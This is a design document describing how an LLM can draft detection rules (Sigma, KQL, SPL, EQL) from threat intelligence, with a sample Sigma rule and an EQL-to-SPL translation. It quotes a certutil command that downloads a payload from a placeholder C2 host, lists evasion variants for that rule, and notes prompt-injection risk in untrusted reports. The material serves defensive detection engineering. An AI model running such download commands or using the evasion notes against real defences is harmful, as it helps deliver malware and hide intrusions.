# UC-19: Detection Rule Generation

## Category

Rule Content Engineering

## Summary

Uses an LLM to generate candidate detection rules from threat intelligence reports, CVE advisories, ATT&CK technique descriptions, or analyst-specified behavioral patterns. The LLM produces draft rules in the appropriate format (Sigma, KQL, SPL, EQL) that capture the described adversary behavior, including detection logic, metadata, and MITRE mappings. All generated rules require human review, testing, and validation before deployment. Additionally, the LLM can perform semantic translation between detection platforms -- converting detection intent across query languages in ways that go beyond mechanical syntax transpilation.

## Problem Statement

Detection engineering is bottlenecked by the human effort required to translate threat knowledge into detection logic. The pipeline looks like:

1. A CTI report, CVE advisory, or red team finding describes adversary behavior.
2. A detection engineer reads the description, understands the technical procedure.
3. The engineer determines which data sources can observe the behavior.
4. The engineer writes a detection rule in the appropriate query language with correct field names, logic, and metadata.
5. The rule is tested against sample data, tuned for FP reduction, and deployed.

Steps 2-4 require deep expertise in both the security domain and the query language. A skilled detection engineer can produce 2-5 quality rules per day, including testing. When a major CTI report drops describing 15 TTPs or a new CVE requires detection across multiple platforms, the backlog grows faster than the team can address it.

Mechanical translation tools like pySigma handle syntax conversion between platforms (Sigma to KQL, Sigma to SPL), but they do not generate new detection logic from a description of adversary behavior. They also cannot perform semantic translation -- when a detection pattern that works in one platform (e.g., EQL sequence queries in Elastic) has no direct syntactic equivalent in another platform (e.g., Splunk), the translation requires reasoning about how to achieve the same detection outcome with different query capabilities.

The LLM accelerates steps 2-4 by generating a draft rule that the engineer reviews and refines rather than writing from scratch. This does not eliminate the human but shifts their role from author to reviewer -- a faster workflow.

## Prerequisites (What Your SIEM/SOAR Should Already Handle)

- **Platform-specific syntax compilation/validation**: Generated rules must be validated against the target platform's query parser. This is deterministic -- do not rely on the LLM to produce syntactically perfect queries.
- **Mechanical format conversion**: For straightforward syntax translation between supported formats, use pySigma or equivalent tools. Do not use an LLM to convert `process.name: foo` from Sigma to `process.name == "foo"` in EQL -- that is a lookup table.
- **Rule deployment pipeline**: Generated rules need a path to testing and deployment (CI/CD, staging environment, rule management platform). The LLM does not deploy rules.
- **Data source documentation**: Your team should know which data sources are available in your environment and which fields they provide. The LLM generates rules against a described data model; you need to validate that the data actually exists.

## Where AI Adds Value

1. **CTI-to-detection translation**: Given a CTI report describing an adversary procedure, the LLM generates detection logic targeting the described behavior:
   - Input: "The actor downloads a second-stage payload using `certutil.exe -urlcache -split -f http://[C2]/payload.bin %TEMP%\update.exe`"
   - Output: A Sigma rule detecting `certutil.exe` execution with `-urlcache` in the command line and a URL pattern, plus a note about potential evasion via parameter order variation.

2. **CVE-to-detection translation**: Given a CVE description with exploitation details, the LLM generates rules targeting observable exploitation indicators:
   - Input: CVE advisory describing a deserialization vulnerability in a Java application server that creates a child process from the Java runtime.
   - Output: A rule detecting child process creation where the parent is the specific Java application server process, with command-line patterns consistent with post-exploitation (shell commands, reverse shell patterns).

3. **ATT&CK technique-to-detection**: Given a technique description and available data sources, the LLM generates rules covering common procedure examples:
   - Input: "Generate detection for T1053.005 (Scheduled Task/Job: Scheduled Task) using Windows Security Event Logs."
   - Output: Rules for Event ID 4698 (task created), 4702 (task updated), with filters for suspicious task properties (execution path in temp directories, tasks running as SYSTEM created by non-admin users, tasks with encoded PowerShell in the action).

4. **Semantic cross-platform translation**: When detection logic in one platform cannot be mechanically translated because the target platform lacks equivalent query constructs, the LLM reasons about alternative detection approaches:
   - Input: An EQL sequence rule detecting "process A creates file B, then within 30 seconds process C executes file B"
   - Challenge: SPL does not have native sequence query syntax
   - LLM output: An SPL query using `transaction` or a time-windowed join to achieve equivalent behavioral detection, with a note explaining the semantic differences and any detection fidelity loss.

5. **Multi-variant generation**: Given a single technique, the LLM generates multiple rule variants at different specificity levels:
   - A high-specificity rule targeting known tooling (low FP, low coverage)
   - A medium-specificity rule targeting behavioral patterns (moderate FP, broader coverage)
   - A broad behavioral rule as a tripwire (higher FP, catches novel variants)
   - This gives the detection engineer options to deploy based on their environment's noise tolerance.

## AI Approach

**LLM prompting with platform-specific few-shot examples.**

### CTI/CVE-to-Detection Workflow
1. Extract the TTP description from the source material (manual selection or LLM-assisted extraction from longer reports).
2. Construct a prompt with:
   - The TTP description
   - Target rule format (Sigma, KQL, SPL, EQL)
   - Target data source (Sysmon, Windows Security, EDR, cloud audit logs)
   - Available field names for the target platform (provide schema reference)
   - 2-3 few-shot examples of rules generated from similar TTP descriptions
3. Request structured output: the rule in the target format plus metadata (name, description, severity, MITRE mapping, known limitations, evasion considerations).
4. Validate generated query syntax deterministically. Flag syntax errors for LLM retry or human fix.

### Semantic Translation Workflow
1. Parse the source rule to extract detection intent and logic.
2. Send to LLM with source rule, source platform, target platform, and target platform's query capabilities.
3. Request the equivalent detection logic in the target platform, plus an explanation of any semantic differences (e.g., "the source uses sequence correlation which is approximated with a time-windowed join in the target -- this may produce slightly different results for events at the boundary of the time window").
4. Validate output syntax. Compare detection scope between source and generated rule.

### Multi-Variant Generation Workflow
1. Provide technique description and data sources.
2. Request 3 rule variants at different specificity levels with explicit specificity labels.
3. Each variant includes estimated FP rate rationale and coverage scope description.

## Data Requirements

### Inputs

| Input | Format | Key Fields Used |
|---|---|---|
| TTP description | Free text (from CTI report, CVE advisory, ATT&CK technique, or analyst input) | Adversary procedure description, tools mentioned, artifacts created |
| Target platform specification | String | Rule format (sigma, kql, spl, eql), data source, field schema |
| Platform field schema | JSON/CSV | Available field names and data types for the target platform |
| Few-shot rule examples | Target format (YAML, TOML, SPL) | 2-3 exemplary rules demonstrating format, style, and quality expectations |
| Source rule (for translation) | Any supported rule format | Full rule content in source format |

> **Note:** Alert data follows the SIEM's standard alert schema with normalized source event fields. Rule files follow their format's defined schema (Elastic TOML, Sigma YAML, Splunk YAML, etc.). These are structured, documented formats -- see [data-requirements/](../../data-requirements/) for platform-specific field references.

### Outputs

Generated detection rules with metadata. Example output for a CTI-derived Sigma rule:

```yaml
title: Certutil URL Cache Download to Temp Directory
id: generated-2025-001
status: experimental
description: |
  Detects certutil.exe being used to download files from a URL using the
  -urlcache flag, with the output directed to a temporary directory. This
  technique is commonly used by threat actors to download second-stage
  payloads while abusing a legitimate Windows utility (LOLBin).
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://lolbas-project.github.io/#/execute/certutil
author: AI-Generated (requires human review)
date: 2025/01/15
tags:
  - attack.command_and_control
  - attack.t1105
  - attack.defense_evasion
  - attack.t1140
logsource:
  category: process_creation
  product: windows
detection:
  selection_process:
    Image|endswith: '\certutil.exe'
  selection_urlcache:
    CommandLine|contains: 'urlcache'
  selection_download:
    CommandLine|contains:
      - 'http://'
      - 'https://'
      - 'ftp://'
  selection_temp_path:
    CommandLine|contains:
      - '\Temp\'
      - '\tmp\'
      - '%TEMP%'
      - '\AppData\Local\Temp'
  condition: selection_process and selection_urlcache and selection_download and selection_temp_path
falsepositives:
  - System administrators using certutil to download legitimate certificates or CRLs
  - Automated certificate management scripts that write to temp directories
  - Software update mechanisms using certutil as a download utility
level: high
# --- AI Generation Notes (remove before deployment) ---
# Known limitations:
# - Does not detect URL download via certutil without -urlcache (e.g., -f flag alone)
# - Parameter order variations may evade: certutil -f -split -urlcache
# - Does not cover certutil encode/decode abuse (separate detection)
# - The temp directory constraint increases specificity but reduces coverage
#   for downloads to other user-writable directories
# Evasion considerations:
# - Attacker may use certutil.exe from a copied/renamed path
# - Attacker may use URL encoding in the command line
# - Consider adding a companion rule without the temp path constraint at
#   medium severity for broader coverage
```

Example semantic translation output (EQL to SPL):

```
Source (EQL):
  sequence by host.name with maxspan=30s
    [process where process.name == "mshta.exe" and process.args : "http*"]
    [network where destination.port == 443 and process.name == "powershell.exe"]

Target (SPL):
  index=windows (EventCode=1 OR EventCode=3)
  | eval event_type=case(EventCode==1, "process", EventCode==3, "network")
  | transaction host maxspan=30s startswith=(event_type="process" AND
    process_name="mshta.exe" AND process_command_line="*http*")
    endswith=(event_type="network" AND dest_port=443 AND
    process_name="powershell.exe")
  | where eventcount >= 2

Translation notes:
- EQL sequence with maxspan translates to SPL transaction with equivalent maxspan.
- SPL transaction is less efficient than EQL sequences at scale; consider
  tstats-based approach for high-volume environments.
- Field names translated from ECS (process.name) to CIM (process_name).
- The EQL 'by host.name' maps to SPL 'transaction host'.
- Semantic difference: SPL transaction groups all events within the span,
  while EQL sequence enforces strict ordering. The SPL version may match
  events in reverse order. Add | where mvindex(event_type, 0)="process"
  to enforce ordering if needed.
```

## Implementation Notes

- **Human review is mandatory**: Generated rules are drafts, not production-ready. Every generated rule must be reviewed by a detection engineer for: query correctness, field name accuracy for the target environment, appropriate severity, FP assessment, and completeness. Do not auto-deploy generated rules.
- **Syntax validation pipeline**: After LLM generation, run the output through the target platform's query parser. For Sigma, use `sigma check`. For KQL, use the Kusto parser. For SPL, use Splunk's search parser API or a dry run. Fix syntax errors (often minor) either programmatically or with a corrective LLM call.
- **Few-shot example curation**: The quality of generated rules depends heavily on the few-shot examples. Curate 3-5 examples per target format that represent your team's quality standards: proper field naming, appropriate specificity, thorough false positive documentation, accurate MITRE mapping.
- **Field name hallucination**: The most common LLM failure mode is using field names that do not exist in the target platform. Mitigate by including the platform's field schema in the prompt and post-validating all field names against the schema.
- **pySigma for mechanical translation**: When translating Sigma to platform-specific queries where pySigma has a backend, use pySigma. It is deterministic, fast, and does not hallucinate. Use LLM translation only when: (a) no pySigma backend exists for the target, (b) the translation requires semantic reasoning (EQL sequences to SPL), or (c) you need to translate between two non-Sigma formats directly.
- **Version control**: Store generated rules with metadata indicating they are AI-generated, which model and prompt version produced them, and the source material (CTI report, CVE ID, etc.). This enables auditing and regeneration.
- **Batch generation for technique sprints**: When building coverage for a technique area (e.g., "all T1053 sub-techniques"), generate candidates for all sub-techniques in one batch, then review and prioritize. This is more efficient than generating one rule at a time.

## Dependencies

- LLM API access with sufficient context window for rule generation (4K-8K tokens per generation)
- Platform-specific query validators/parsers for syntax checking
- pySigma for mechanical translations (use LLM only when pySigma cannot handle the translation)
- [UC-18: Rule Quality Assessment](18-rule-quality-assessment.md) -- Run quality assessment on generated rules before deployment
- Target platform field schema documentation

## Complexity Assessment

| Dimension | Rating | Notes |
|---|---|---|
| Data engineering | Medium | Requires curated few-shot examples per target format, platform field schemas, and a post-generation validation pipeline. |
| AI/ML complexity | Medium-High | Prompt engineering must handle diverse input types (CTI text, CVE advisories, technique descriptions). Generated output must be syntactically valid in the target query language -- a higher bar than free-text generation. Multi-variant generation adds prompt complexity. |
| Integration effort | Medium | Output feeds into existing rule management workflows (Git PR, SIEM API, rule staging environment). Syntax validation integration per platform adds effort. |
| Overall | **Medium-High** | The LLM prompting is moderately complex, and the validation/review pipeline around it requires significant engineering. The main challenge is ensuring generated rules are high-quality enough that human review is refinement, not rewriting. |

## Real-World Considerations

- **Analyst trust and adoption**: Detection engineers may distrust AI-generated rules initially. Start with a collaborative workflow: the LLM generates a draft, the engineer refines it. Track time savings (e.g., "average rule creation time reduced from 45 minutes to 15 minutes including review"). Concrete metrics build trust.
- **Quality variance**: LLM output quality varies by technique complexity and query language. Rules for well-documented techniques with clear observable patterns (process creation, file writes) are higher quality than rules for abstract techniques (T1027 Obfuscated Files or Information) where the detection approach is ambiguous.
- **False sense of coverage**: Generating 50 rules from a CTI report does not mean you have good coverage. Generated rules may be superficial, covering only the most obvious procedure variant. Quality assessment (UC-18) must be applied to generated rules.
- **Model capability evolution**: As LLMs improve at code generation, rule generation quality will improve. Build the validation and review pipeline now so that better models slot in seamlessly.
- **Prompt injection risk**: If using CTI reports from untrusted sources as input, be aware that adversary-crafted CTI could contain prompt injection attempts. Sanitize inputs and validate outputs independently.
- **Intellectual property**: Understand your organization's policy on using AI-generated code in production security tooling. Some organizations require disclosure; others restrict it. Generated rules should carry metadata indicating AI generation.
- **Cost**: Rule generation is a low-volume, high-value use case. Generating 10-20 rules per week costs pennies. The cost constraint is human review time, not LLM API costs.

## Related Use Cases

- [UC-17: Rule Comparison and Gap Analysis](17-rule-comparison-and-gap-analysis.md) -- Identified coverage gaps become generation targets. The gap analysis says "we have no rule for T1003.003 NTDS.dit extraction"; rule generation produces the candidate.
- [UC-18: Rule Quality Assessment](18-rule-quality-assessment.md) -- All generated rules should be assessed for quality before deployment. This catches LLM-generated rules that are syntactically correct but semantically weak.
- [UC-15: LLM Investigation Guide Generation](15-llm-investigation-guide-generation.md) -- Generate investigation guides alongside new rules for a complete detection package.
- [UC-16: Observable Artifact Extraction](16-observable-artifact-extraction.md) -- Extract observables from generated rules to verify they match the intended detection scope.
- [UC-23: Synthetic Detection Testing Data Generation](23-synthetic-detection-testing-data.md) -- Generated rules need test data. UC-23 produces labeled synthetic events (true positives, false positives, evasion variants) to validate that generated rules fire correctly before deployment.

## References

- [pySigma](https://github.com/SigmaHQ/pySigma) -- Deterministic Sigma rule conversion; use for mechanical translations before resorting to LLM.
- [Sigma Rule Specification](https://sigmahq.io/sigma-specification/) -- Rule format reference for Sigma generation.
- [LOLBAS Project](https://lolbas-project.github.io/) -- Living Off the Land Binaries reference, useful context for LOLBin-based detection generation.
- [Elastic Detection Rules](https://github.com/elastic/detection-rules) -- Reference rules in Elastic format for few-shot examples.
- [Splunk Security Content](https://github.com/splunk/security_content) -- Reference rules in Splunk format for few-shot examples.
- [MITRE ATT&CK](https://attack.mitre.org/) -- Technique descriptions as generation inputs.
- [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) -- Atomic tests for techniques; useful for validating generated rules against known test procedures.
